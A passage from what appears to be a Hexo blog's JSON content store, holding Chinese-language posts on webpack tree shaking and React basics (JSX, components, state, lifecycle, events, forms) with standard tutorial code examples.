class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tree-shaking-的使用和原理分析\"><a href=\"#tree-shaking-的使用和原理分析\" class=\"headerlink\" title=\"tree shaking 的使用和原理分析\"></a>tree shaking 的使用和原理分析</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>1 个模块可能有多个方法，只要其中的某个方法使用到了，则整个文件都会被打到<br>bundle 里面去，tree shaking 就是只把用到的方法打入 bundle，没用到的方法会在<br>uglify 阶段被擦除掉。</p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>webpack4.x 在 mode 设置为 production 时默认开启，webpack3.x 与 webpack2.x 在.babelrc 里设置 modules: false 即可。</p>\n<h3 id=\"DCE-Dead-code-elimination\"><a href=\"#DCE-Dead-code-elimination\" class=\"headerlink\" title=\"DCE (Dead code elimination)\"></a>DCE (Dead code elimination)</h3><p>在保持代码运行结果不变的前提下，去除无用的代码。</p>\n<ul>\n<li>代码执行的结果不会被用到</li>\n<li>代码不会被执行，不可到达</li>\n<li>代码只会影响死变量（只写不不读）<br>tree shaking 是 DCE 的一种方式，它可以在打包时忽略没有用到的代码。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'这段代码永远不会执行’);</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>利用 ES6 模块的特点（只能作为模块顶层的语句句出现、import 的模块名只能是字符串串常量和引入的模块不可改变），在打包阶段对静态代码进行 AST 语法分析，对有用和无用的模块打上不同标签，“uglify”阶段删除无用代码。</p>\n<h3 id=\"局限性\"><a href=\"#局限性\" class=\"headerlink\" title=\"局限性\"></a>局限性</h3><p>1，只能是静态声明和引用的 ES6 模块，不能是动态引入和声明的；</p>\n<p>在打包阶段对冗余代码进行删除，就需要 webpack 需要在打包阶段确定模块文件的内部结构，而 ES 模块的引用和输出必须出现在文件结构的第一级（’import’ and ‘export’ may only appear at the top level），否则会报错。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack编译时会报错</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (condition) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">import</span> module1 <span class=\"keyword\">from</span> <span class=\"string\">\"./module1\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">import</span> module2 <span class=\"keyword\">from</span> <span class=\"string\">\"./module2\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而 CommonJS 模块支持动态结构的，所以不能对 CommonJS 模块进行 tree-shaking 处理。</p>\n<p>2，只能处理模块级别，不能处理函数级别的冗余；<br>因为 webpack 的 tree-shaking 是基于模块间的依赖关系，所以并不能对模块内部自身的无用代码进行删除。</p>\n<p>3，只能处理 JS 相关冗余代码，不能处理 CSS 冗余代码。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《极客时间》</p>"},{"title":"React基础知识","date":"2019-07-03T00:36:40.000Z","updated":"2019-07-03T00:36:40.000Z","_content":"\n# 概述\n\n对 React 的基础知识作一个总结。\n\n<!-- more -->\n\n# 详述\n\n## Hello World\n\n```js\nReactDOM.render(<h1>Hello, world!</h1>, document.getElementById('root'));\n```\n\n## JSX\n\n不是新事物，而是一种语法糖，Babel 转译后调用 React.createElement() ，因此具有 JavaScript 的全部功能。\n\n类似一些前端模板引擎的语法，JSX 中用大括号`{}`来包裹 JavaScript 变量和表达式。\n\n属性用 camelCase 命名法，例如 class-className、tabindex-tabIndex。属性值如果是字符串值直接用引号，如果是表达式用大括号。\n\n```js\n// 引用变量\nconst name = 'Josh Perez';\nconst element = <h1>Hello, {name}</h1>;\n\n// 引用表达式\nfunction formatName(user) {\n  return user.firstName + ' ' + user.lastName;\n}\n\nconst user = {\n  firstName: 'Harper',\n  lastName: 'Perez'\n};\n\nconst element = <h1>Hello, {formatName(user)}!</h1>;\n\nReactDOM.render(element, document.getElementById('root'));\n\n// 属性值为字符串\nconst element = <div tabIndex=\"0\" />;\n\n// 属性值为表达式\nconst element = <img src={user.avatarUrl} />;\n\n// 需要把 CSS 属性变成一个对象再传给元素\nconst element = <h1 style={{ fontSize: '12px', color: 'red' }}>hello react</h1>;\n```\n\n## 元素\n\n元素是构成 React 应用的最小砖块。React 元素是不可变对象。一旦被创建，你就无法更改它的子元素或者属性。一个元素就像电影的单帧：它代表了某个特定时刻的 UI。更新 UI 唯一的方式是创建一个全新的元素，并将其传入 ReactDOM.render()。\n\n## 组件\n\n组件是独立可复用的代码片段，由一个或多个元素组成，是根据 UI 需要对元素的进一步抽象封装，因此可以自由的拆分组合使用，就像使用 HTML 元素那样。形式上分为函数组件和 class 组件，一般不需要维护私有状态 state 的，推荐用函数组件。\n\n```js\n// 函数组件\nfunction Welcome(props) {\n  return <h1>Hello, {props.name}</h1>;\n}\n// class组件\nclass Welcome extends React.Component {\n  render() {\n    return <h1>Hello, {this.props.name}</h1>;\n  }\n}\n// 组件的组合使用\nfunction Avatar(props) {\n  return (\n    <img className=\"Avatar\" src={props.user.avatarUrl} alt={props.user.name} />\n  );\n}\nfunction UserInfo(props) {\n  return (\n    <div className=\"UserInfo\">\n      <Avatar user={props.user} />\n      <div className=\"UserInfo-name\">{props.user.name}</div>\n    </div>\n  );\n}\nfunction Comment(props) {\n  return (\n    <div className=\"Comment\">\n      <UserInfo user={props.author} />\n      <div className=\"Comment-text\">{props.text}</div>\n      <div className=\"Comment-date\">{formatDate(props.date)}</div>\n    </div>\n  );\n}\n```\n\n## Props 与 State\n\n组件可以把它的 state 作为 props 向下传递到它的子组件中，而子组件不能直接修改 props，只能通过事件通知父级修改；state 是记录自身状态的私有属性，可以修改。这种数据流向是“自上而下”的，一般称为单向数据流。\n\nprops.children 可以理解为插槽。\n\nstate 修改需要注意三点：\n\n1. 不要直接修改 State，而是调用 `setState()`方法；\n2. State 的更新可能是异步的，因此不能依赖当前状态去更新下一个状态；\n3. State 的更新会被合并。\n\n## 生命周期\n\n组件的生命周期图谱如下：\n![生命周期图谱](life.jpg)\n通常在 constructor 中进行 state 等初始化工作，componentDidMount 中进行 DOM 渲染完成后的工作，componentWillUnmount 中进行资源释放工作。示例如下：\n\n```js\nclass Clock extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { date: new Date() };\n  }\n\n  componentDidMount() {\n    this.timerID = setInterval(() => this.tick(), 1000);\n  }\n\n  componentWillUnmount() {\n    clearInterval(this.timerID);\n  }\n\n  tick() {\n    this.setState({\n      date: new Date()\n    });\n  }\n\n  render() {\n    return (\n      <div>\n        <h1>Hello, world!</h1>\n        <h2>It is {this.state.date.toLocaleTimeString()}.</h2>\n      </div>\n    );\n  }\n}\n\nReactDOM.render(<Clock />, document.getElementById('root'));\n```\n\n更多生命周期介绍请参考[官方文档](http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/)。\n\n## 事件处理\n\nReact 元素的事件处理和 DOM 元素的很相似，但是有一点语法上的不同:\n\n- React 事件的命名采用小驼峰式（camelCase），而不是纯小写。\n- 使用 JSX 语法时你需要传入一个函数作为事件处理函数，而不是一个字符串。\n\n```js\n<button onClick={activateLasers}>Activate Lasers</button>\n```\n\n### 注意事项：\n\n#### 不能通过放回 false 的方式组织默认行为，而是要显式的使用 preventDefault\n\n```html\n<!-- 错误 -->\n<a href=\"#\" onclick=\"console.log('The link was clicked.'); return false\">\n  Click me\n</a>\n```\n\n```js\n// 正确\nfunction ActionLink() {\n  function handleClick(e) {\n    e.preventDefault();\n    console.log('The link was clicked.');\n  }\n\n  return (\n    <a href=\"#\" onClick={handleClick}>\n      Click me\n    </a>\n  );\n}\n```\n\n#### 回调函数中的 this 绑定问题\n\n因为传入的回调函数在调用的时候上下文（context）已经不是该组件实例本身，所以想要 this 指向该组件实例本身，需要传入的时候显式的指定上下文。\n\nbind 用法：\n\n```js\nclass Title extends Component {\n  handleClickOnTitle(e) {\n    console.log(this);\n  }\n\n  render() {\n    return <h1 onClick={this.handleClickOnTitle.bind(this)}>React 小书</h1>;\n  }\n}\n```\n\nclass fields 用法（Create React App 默认启用此语法）：\n\n```js\nclass LoggingButton extends React.Component {\n  // 此语法确保 `handleClick` 内的 `this` 已被绑定。\n  // 注意: 这是 *实验性* 语法。\n  handleClick = () => {\n    console.log('this is:', this);\n  };\n\n  render() {\n    return <button onClick={this.handleClick}>Click me</button>;\n  }\n}\n```\n\n箭头函数用法：\n\n```js\nclass LoggingButton extends React.Component {\n  handleClick() {\n    console.log('this is:', this);\n  }\n\n  render() {\n    // 此语法确保 `handleClick` 内的 `this` 已被绑定。\n    return <button onClick={e => this.handleClick(e)}>Click me</button>;\n  }\n}\n```\n\n## 条件渲染与列表\n\nJSX 只是 JavaScript 的语法糖，可以完全使用 JavaScript 特性。对于列表渲染，需要在加上 key，值只要保证兄弟节点间唯一即可。\n\n## 表单\n\n### 受控组件\n\n表单数据由 React 组件来管理。具体实现形式如下：\n\n```js\nclass NameForm extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { value: '' };\n\n    this.handleChange = this.handleChange.bind(this);\n    this.handleSubmit = this.handleSubmit.bind(this);\n  }\n\n  handleChange(event) {\n    this.setState({ value: event.target.value });\n  }\n\n  handleSubmit(event) {\n    alert('提交的名字: ' + this.state.value);\n    event.preventDefault();\n  }\n\n  render() {\n    return (\n      <form onSubmit={this.handleSubmit}>\n        <label>\n          名字:\n          <input\n            type=\"text\"\n            value={this.state.value}\n            onChange={this.handleChange}\n          />\n        </label>\n        <input type=\"submit\" value=\"提交\" />\n      </form>\n    );\n  }\n}\n```\n\n作为受控组件，`<textarea>` 和 `<select>`元素赋值形式做了调整，改成与 input 相同，如下：\n\n```js\n\n<textarea value={this.state.value} onChange={this.handleChange} />\n\n<select value={this.state.value} onChange={this.handleChange}>\n  <option value=\"grapefruit\">葡萄柚</option>\n  <option value=\"lime\">酸橙</option>\n  <option value=\"coconut\">椰子</option>\n  <option value=\"mango\">芒果</option>\n</select>\n```\n\n注意点：\n\n文件 input 标签为非受控组件`<input type=\"file\" />`。\n\n设置了 value 值的受控组件是不可编辑的，若仍然可编辑，那可能是 value 值为 undefined 或 null。\n\n### 非受控组件\n\n将在高级部分讲解，[官方文档](https://zh-hans.reactjs.org/docs/uncontrolled-components.html)。\n\n## 状态提升\n\n通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。\n\n## 组合 vs 继承\n\nReact 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用。\n\n### 包含关系\n\n概念同 Vue 的插槽\n\n```js\n// 匿名\nfunction FancyBorder(props) {\n  return (\n    <div className={'FancyBorder FancyBorder-' + props.color}>\n      {props.children}\n    </div>\n  );\n}\nfunction WelcomeDialog() {\n  return (\n    <FancyBorder color=\"blue\">\n      <h1 className=\"Dialog-title\">Welcome</h1>\n      <p className=\"Dialog-message\">Thank you for visiting our spacecraft!</p>\n    </FancyBorder>\n  );\n}\n// 具名\nfunction SplitPane(props) {\n  return (\n    <div className=\"SplitPane\">\n      <div className=\"SplitPane-left\">{props.left}</div>\n      <div className=\"SplitPane-right\">{props.right}</div>\n    </div>\n  );\n}\nfunction App() {\n  return <SplitPane left={<Contacts />} right={<Chat />} />;\n}\n```\n\n# 参考\n\nhttp://huziketang.mangojuice.top/books/react/lesson9\n\nhttps://zh-hans.reactjs.org/docs/introducing-jsx.html\n","source":"_posts/2019/07/react-basic.md","raw":"---\ntitle: React基础知识\npermalink: react-basic\ntags:\n  - React\ncategories:\n  - 框架与库\n  - React\ndate: 2019-07-03 08:36:40\nupdated: 2019-07-03 08:36:40\n---\n\n# 概述\n\n对 React 的基础知识作一个总结。\n\n<!-- more -->\n\n# 详述\n\n## Hello World\n\n```js\nReactDOM.render(<h1>Hello, world!</h1>, document.getElementById('root'));\n```\n\n## JSX\n\n不是新事物，而是一种语法糖，Babel 转译后调用 React.createElement() ，因此具有 JavaScript 的全部功能。\n\n类似一些前端模板引擎的语法，JSX 中用大括号`{}`来包裹 JavaScript 变量和表达式。\n\n属性用 camelCase 命名法，例如 class-className、tabindex-tabIndex。属性值如果是字符串值直接用引号，如果是表达式用大括号。\n\n```js\n// 引用变量\nconst name = 'Josh Perez';\nconst element = <h1>Hello, {name}</h1>;\n\n// 引用表达式\nfunction formatName(user) {\n  return user.firstName + ' ' + user.lastName;\n}\n\nconst user = {\n  firstName: 'Harper',\n  lastName: 'Perez'\n};\n\nconst element = <h1>Hello, {formatName(user)}!</h1>;\n\nReactDOM.render(element, document.getElementById('root'));\n\n// 属性值为字符串\nconst element = <div tabIndex=\"0\" />;\n\n// 属性值为表达式\nconst element = <img src={user.avatarUrl} />;\n\n// 需要把 CSS 属性变成一个对象再传给元素\nconst element = <h1 style={{ fontSize: '12px', color: 'red' }}>hello react</h1>;\n```\n\n## 元素\n\n元素是构成 React 应用的最小砖块。React 元素是不可变对象。一旦被创建，你就无法更改它的子元素或者属性。一个元素就像电影的单帧：它代表了某个特定时刻的 UI。更新 UI 唯一的方式是创建一个全新的元素，并将其传入 ReactDOM.render()。\n\n## 组件\n\n组件是独立可复用的代码片段，由一个或多个元素组成，是根据 UI 需要对元素的进一步抽象封装，因此可以自由的拆分组合使用，就像使用 HTML 元素那样。形式上分为函数组件和 class 组件，一般不需要维护私有状态 state 的，推荐用函数组件。\n\n```js\n// 函数组件\nfunction Welcome(props) {\n  return <h1>Hello, {props.name}</h1>;\n}\n// class组件\nclass Welcome extends React.Component {\n  render() {\n    return <h1>Hello, {this.props.name}</h1>;\n  }\n}\n// 组件的组合使用\nfunction Avatar(props) {\n  return (\n    <img className=\"Avatar\" src={props.user.avatarUrl} alt={props.user.name} />\n  );\n}\nfunction UserInfo(props) {\n  return (\n    <div className=\"UserInfo\">\n      <Avatar user={props.user} />\n      <div className=\"UserInfo-name\">{props.user.name}</div>\n    </div>\n  );\n}\nfunction Comment(props) {\n  return (\n    <div className=\"Comment\">\n      <UserInfo user={props.author} />\n      <div className=\"Comment-text\">{props.text}</div>\n      <div className=\"Comment-date\">{formatDate(props.date)}</div>\n    </div>\n  );\n}\n```\n\n## Props 与 State\n\n组件可以把它的 state 作为 props 向下传递到它的子组件中，而子组件不能直接修改 props，只能通过事件通知父级修改；state 是记录自身状态的私有属性，可以修改。这种数据流向是“自上而下”的，一般称为单向数据流。\n\nprops.children 可以理解为插槽。\n\nstate 修改需要注意三点：\n\n1. 不要直接修改 State，而是调用 `setState()`方法；\n2. State 的更新可能是异步的，因此不能依赖当前状态去更新下一个状态；\n3. State 的更新会被合并。\n\n## 生命周期\n\n组件的生命周期图谱如下：\n![生命周期图谱](life.jpg)\n通常在 constructor 中进行 state 等初始化工作，componentDidMount 中进行 DOM 渲染完成后的工作，componentWillUnmount 中进行资源释放工作。示例如下：\n\n```js\nclass Clock extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { date: new Date() };\n  }\n\n  componentDidMount() {\n    this.timerID = setInterval(() => this.tick(), 1000);\n  }\n\n  componentWillUnmount() {\n    clearInterval(this.timerID);\n  }\n\n  tick() {\n    this.setState({\n      date: new Date()\n    });\n  }\n\n  render() {\n    return (\n      <div>\n        <h1>Hello, world!</h1>\n        <h2>It is {this.state.date.toLocaleTimeString()}.</h2>\n      </div>\n    );\n  }\n}\n\nReactDOM.render(<Clock />, document.getElementById('root'));\n```\n\n更多生命周期介绍请参考[官方文档](http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/)。\n\n## 事件处理\n\nReact 元素的事件处理和 DOM 元素的很相似，但是有一点语法上的不同:\n\n- React 事件的命名采用小驼峰式（camelCase），而不是纯小写。\n- 使用 JSX 语法时你需要传入一个函数作为事件处理函数，而不是一个字符串。\n\n```js\n<button onClick={activateLasers}>Activate Lasers</button>\n```\n\n### 注意事项：\n\n#### 不能通过放回 false 的方式组织默认行为，而是要显式的使用 preventDefault\n\n```html\n<!-- 错误 -->\n<a href=\"#\" onclick=\"console.log('The link was clicked.'); return false\">\n  Click me\n</a>\n```\n\n```js\n// 正确\nfunction ActionLink() {\n  function handleClick(e) {\n    e.preventDefault();\n    console.log('The link was clicked.');\n  }\n\n  return (\n    <a href=\"#\" onClick={handleClick}>\n      Click me\n    </a>\n  );\n}\n```\n\n#### 回调函数中的 this 绑定问题\n\n因为传入的回调函数在调用的时候上下文（context）已经不是该组件实例本身，所以想要 this 指向该组件实例本身，需要传入的时候显式的指定上下文。\n\nbind 用法：\n\n```js\nclass Title extends Component {\n  handleClickOnTitle(e) {\n    console.log(this);\n  }\n\n  render() {\n    return <h1 onClick={this.handleClickOnTitle.bind(this)}>React 小书</h1>;\n  }\n}\n```\n\nclass fields 用法（Create React App 默认启用此语法）：\n\n```js\nclass LoggingButton extends React.Component {\n  // 此语法确保 `handleClick` 内的 `this` 已被绑定。\n  // 注意: 这是 *实验性* 语法。\n  handleClick = () => {\n    console.log('this is:', this);\n  };\n\n  render() {\n    return <button onClick={this.handleClick}>Click me</button>;\n  }\n}\n```\n\n箭头函数用法：\n\n```js\nclass LoggingButton extends React.Component {\n  handleClick() {\n    console.log('this is:', this);\n  }\n\n  render() {\n    // 此语法确保 `handleClick` 内的 `this` 已被绑定。\n    return <button onClick={e => this.handleClick(e)}>Click me</button>;\n  }\n}\n```\n\n## 条件渲染与列表\n\nJSX 只是 JavaScript 的语法糖，可以完全使用 JavaScript 特性。对于列表渲染，需要在加上 key，值只要保证兄弟节点间唯一即可。\n\n## 表单\n\n### 受控组件\n\n表单数据由 React 组件来管理。具体实现形式如下：\n\n```js\nclass NameForm extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { value: '' };\n\n    this.handleChange = this.handleChange.bind(this);\n    this.handleSubmit = this.handleSubmit.bind(this);\n  }\n\n  handleChange(event) {\n    this.setState({ value: event.target.value });\n  }\n\n  handleSubmit(event) {\n    alert('提交的名字: ' + this.state.value);\n    event.preventDefault();\n  }\n\n  render() {\n    return (\n      <form onSubmit={this.handleSubmit}>\n        <label>\n          名字:\n          <input\n            type=\"text\"\n            value={this.state.value}\n            onChange={this.handleChange}\n          />\n        </label>\n        <input type=\"submit\" value=\"提交\" />\n      </form>\n    );\n  }\n}\n```\n\n作为受控组件，`<textarea>` 和 `<select>`元素赋值形式做了调整，改成与 input 相同，如下：\n\n```js\n\n<textarea value={this.state.value} onChange={this.handleChange} />\n\n<select value={this.state.value} onChange={this.handleChange}>\n  <option value=\"grapefruit\">葡萄柚</option>\n  <option value=\"lime\">酸橙</option>\n  <option value=\"coconut\">椰子</option>\n  <option value=\"mango\">芒果</option>\n</select>\n```\n\n注意点：\n\n文件 input 标签为非受控组件`<input type=\"file\" />`。\n\n设置了 value 值的受控组件是不可编辑的，若仍然可编辑，那可能是 value 值为 undefined 或 null。\n\n### 非受控组件\n\n将在高级部分讲解，[官方文档](https://zh-hans.reactjs.org/docs/uncontrolled-components.html)。\n\n## 状态提升\n\n通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。\n\n## 组合 vs 继承\n\nReact 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用。\n\n### 包含关系\n\n概念同 Vue 的插槽\n\n```js\n// 匿名\nfunction FancyBorder(props) {\n  return (\n    <div className={'FancyBorder FancyBorder-' + props.color}>\n      {props.children}\n    </div>\n  );\n}\nfunction WelcomeDialog() {\n  return (\n    <FancyBorder color=\"blue\">\n      <h1 className=\"Dialog-title\">Welcome</h1>\n      <p className=\"Dialog-message\">Thank you for visiting our spacecraft!</p>\n    </FancyBorder>\n  );\n}\n// 具名\nfunction SplitPane(props) {\n  return (\n    <div className=\"SplitPane\">\n      <div className=\"SplitPane-left\">{props.left}</div>\n      <div className=\"SplitPane-right\">{props.right}</div>\n    </div>\n  );\n}\nfunction App() {\n  return <SplitPane left={<Contacts />} right={<Chat />} />;\n}\n```\n\n# 参考\n\nhttp://huziketang.mangojuice.top/books/react/lesson9\n\nhttps://zh-hans.reactjs.org/docs/introducing-jsx.html\n","slug":"react-basic","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d92800bmwovvjdjlbdnj","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>对 React 的基础知识作一个总结。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, world!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"JSX\"><a href=\"#JSX\" class=\"headerlink\" title=\"JSX\"></a>JSX</h2><p>不是新事物，而是一种语法糖，Babel 转译后调用 React.createElement() ，因此具有 JavaScript 的全部功能。</p>\n<p>类似一些前端模板引擎的语法，JSX 中用大括号<code>{}</code>来包裹 JavaScript 变量和表达式。</p>\n<p>属性用 camelCase 命名法，例如 class-className、tabindex-tabIndex。属性值如果是字符串值直接用引号，如果是表达式用大括号。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 引用变量</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> name = <span class=\"string\">'Josh Perez'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 引用表达式</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">formatName</span>(<span class=\"params\">user</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> user.firstName + <span class=\"string\">' '</span> + user.lastName;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> user = &#123;</span><br><span class=\"line\">  firstName: <span class=\"string\">'Harper'</span>,</span><br><span class=\"line\">  lastName: <span class=\"string\">'Perez'</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;formatName(user)&#125;!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(element, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 属性值为字符串</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">tabIndex</span>=<span class=\"string\">\"0\"</span> /&gt;</span>;</span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">// 属性值为表达式</span></span><br><span class=\"line\">const element = &lt;img src=&#123;user.avatarUrl&#125; /&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 需要把 CSS 属性变成一个对象再传给元素</span><br><span class=\"line\">const element = &lt;h1 style=&#123;&#123; fontSize: '12px', color: 'red' &#125;&#125;&gt;hello react&lt;/h1&gt;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"元素\"><a href=\"#元素\" class=\"headerlink\" title=\"元素\"></a>元素</h2><p>元素是构成 React 应用的最小砖块。React 元素是不可变对象。一旦被创建，你就无法更改它的子元素或者属性。一个元素就像电影的单帧：它代表了某个特定时刻的 UI。更新 UI 唯一的方式是创建一个全新的元素，并将其传入 ReactDOM.render()。</p>\n<h2 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h2><p>组件是独立可复用的代码片段，由一个或多个元素组成，是根据 UI 需要对元素的进一步抽象封装，因此可以自由的拆分组合使用，就像使用 HTML 元素那样。形式上分为函数组件和 class 组件，一般不需要维护私有状态 state 的，推荐用函数组件。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数组件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Welcome</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// class组件</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Welcome</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;this.props.name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 组件的组合使用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Avatar</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;img className=<span class=\"string\">\"Avatar\"</span> src=&#123;props.user.avatarUrl&#125; alt=&#123;props.user.name&#125; /&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">UserInfo</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div className=<span class=\"string\">\"UserInfo\"</span>&gt;</span><br><span class=\"line\">      &lt;Avatar user=&#123;props.user&#125; /&gt;</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"UserInfo-name\"</span>&gt;&#123;props.user.name&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>div&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Comment</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div className=<span class=\"string\">\"Comment\"</span>&gt;</span><br><span class=\"line\">      